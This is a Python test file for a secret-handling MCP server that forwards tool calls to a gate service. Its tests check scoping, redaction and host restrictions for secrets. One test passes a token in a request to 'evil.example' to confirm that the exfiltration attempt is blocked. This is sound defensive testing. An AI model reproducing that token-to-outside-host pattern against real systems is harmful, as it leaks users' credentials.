"""`secret-gate mcp` as a forwarder to the gate service (gate-service-v0 §4): same tools, calls go to mcp.*;
`secret_exec` only fetches its values from the service (`exec.resolve`) and runs the command here (gate-simple-v0 §2.1)."""

from __future__ import annotations

import asyncio
import json
import subprocess

import httpx
import pytest
from mcp.server.fastmcp.exceptions import ToolError

from secret_gate.constants import KIND_TOTP, USE_EXEC, USE_HTTP, USE_OTP
from secret_gate.keystore import load_public_key
from secret_gate.mcp_backend import LocalMcpBackend, RemoteMcpBackend, default_backend
from secret_gate.mcp_server import build_server
from secret_gate.policy import SecretPayload
from secret_gate.tokens import make_token
from tests.fixtures import fake_secrets as fs
from tests.service_fixtures import running_service

SCOPE = "mcp-scope-0123456789abcdefghij"


def _token(home, **kw) -> str:
    fields = {"value": fs.PORTAL.password, "hosts": list(fs.PORTAL.hosts), "uses": {USE_HTTP}, "label": "portal-a/pass", **kw}
    return make_token(load_public_key(home), SecretPayload.create(**fields))


def _tool_text(result) -> str:
    blocks = result[0] if isinstance(result, tuple) else result          # (content, structured) for str results
    return "\n".join(block.text for block in blocks)


def test_tool_definitions_are_identical_with_and_without_the_service(gate_home):
    async def definitions(backend):
        return [tool.model_dump() for tool in await build_server(backend).list_tools()]

    with running_service() as svc:
        local = asyncio.run(definitions(LocalMcpBackend.from_home(gate_home, None)))
        remote = asyncio.run(definitions(RemoteMcpBackend(svc.client, None)))
    assert local == remote
    assert {t["name"] for t in local} == {"secret_describe", "secret_otp", "secret_http", "secret_exec"}
    exec_tool = next(t for t in local if t["name"] == "secret_exec")
    assert set(exec_tool["inputSchema"]["required"]) == {"argv", "env"}
    assert "environment variables" in exec_tool["description"] and "template" not in exec_tool["description"]


def test_every_tool_is_forwarded_with_this_executions_scope():
    seen: list[httpx.Request] = []
    calls: list[str] = []

    def site(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, text="welcome " + request.headers["authorization"])

    client = httpx.Client(transport=httpx.MockTransport(site))
    with running_service(http_client=lambda: client) as svc:
        original = svc.service.call
        svc.service.call = lambda method, params: calls.append(method) or original(method, params)
        token = _token(svc.home, uses={USE_HTTP, USE_EXEC})
        totp = _token(svc.home, value=fs.TOTP_SECRET_B32, uses={USE_OTP}, kind=KIND_TOTP, label="portal-a/totp")
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})["refs"][0]["ref"]
        server = build_server(RemoteMcpBackend(svc.client, SCOPE))

        async def scenario() -> dict[str, str]:
            return {
                "describe": _tool_text(await server.call_tool("secret_describe", {"token": ref})),
                "http": _tool_text(await server.call_tool("secret_http", {"method": "GET", "url": "https://portal-a.example.com/",
                                                                           "headers": {"Authorization": f"Bearer {ref}"}})),
                "exec": _tool_text(await server.call_tool("secret_exec", {"argv": ["/bin/sh", "-c", "echo got $PW"],
                                                                           "env": {"PW": ref}})),
                "otp": _tool_text(await server.call_tool("secret_otp", {"token": totp})),
            }

        out = asyncio.run(scenario())
        assert json.loads(out["describe"])["ref"] == ref
        assert seen[0].headers["authorization"] == f"Bearer {fs.PORTAL.password}"
        assert json.loads(out["http"])["body"] == "welcome Bearer [REDACTED:portal-a/pass]"
        assert json.loads(out["exec"]) == {"returncode": 0, "stdout": "got [REDACTED:portal-a/pass]\n", "stderr": ""}
        assert out["otp"].isdigit() and len(out["otp"]) == 6
        assert calls[1:] == ["mcp.describe", "mcp.http", "exec.resolve", "mcp.otp"]
        everything = json.dumps(out)
        assert fs.PORTAL.password not in everything and fs.TOTP_SECRET_B32 not in everything


def test_service_errors_reach_the_model_as_the_same_tool_errors():
    with running_service() as svc:
        token = _token(svc.home)
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})["refs"][0]["ref"]
        unscoped = build_server(RemoteMcpBackend(svc.client, None))

        async def call(name: str, args: dict) -> str:
            with pytest.raises(ToolError) as exc:
                await unscoped.call_tool(name, args)
            return str(exc.value)

        assert "secret-gate: enc:ref: references only work inside the task" in asyncio.run(call("secret_describe", {"token": ref}))
        assert "not allowed on host" in asyncio.run(call("secret_http", {"method": "GET", "url": f"https://evil.example/?t={token}"}))
        assert "does not allow use 'exec'" in asyncio.run(call("secret_exec", {"argv": ["true"], "env": {"PW": token}}))
        assert "argv 中不能有密文" in asyncio.run(call("secret_exec", {"argv": ["echo", token], "env": {"PW": token}}))
        with pytest.raises(ToolError):
            asyncio.run(unscoped.call_tool("secret_repair", {"token": token, "host": "portal-a.example.com"}))


def test_default_backend_follows_the_socket(gate_home, monkeypatch):
    # The process environment, which no_real_gate_service points away from the machine's real socket.
    assert isinstance(default_backend(), LocalMcpBackend)
    with running_service() as svc:
        monkeypatch.setattr("secret_gate.mcp_backend.client_socket", lambda env: svc.socket)
        backend = default_backend({"SECRET_GATE_SCOPE": SCOPE})
        assert isinstance(backend, RemoteMcpBackend)
        assert backend.describe(_token(svc.home))["label"] == "portal-a/pass"


def test_remote_exec_runs_here_not_in_the_service():
    """The command never reaches the service: it gets one `exec.resolve` per variable, and this process runs it."""
    ran: list[list[str]] = []

    def runner(argv, **kw):
        ran.append(argv)
        return subprocess.CompletedProcess(argv, 0, stdout=kw["env"]["PW"], stderr="")

    with running_service() as svc:
        calls: list[tuple[str, dict]] = []
        original = svc.service.call
        svc.service.call = lambda method, params: calls.append((method, dict(params))) or original(method, params)
        token = _token(svc.home, uses={USE_EXEC}, hosts=[], label="db/pass")
        out = RemoteMcpBackend(svc.client, None, exec_runner=runner).exec(["psql", "-c", "select 1"], {"PW": token})
        assert out["stdout"] == "[REDACTED:db/pass]" and ran == [["psql", "-c", "select 1"]]
        assert calls == [("exec.resolve", {"token": token})]                # no argv, no env names went to the service
